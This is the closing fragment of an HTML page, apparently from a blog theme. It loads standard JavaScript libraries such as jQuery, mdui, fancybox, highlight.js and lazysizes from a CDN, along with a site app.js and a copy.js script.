  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
 
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


 
    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1577801085792"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>


    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>



  





</body>

</html>
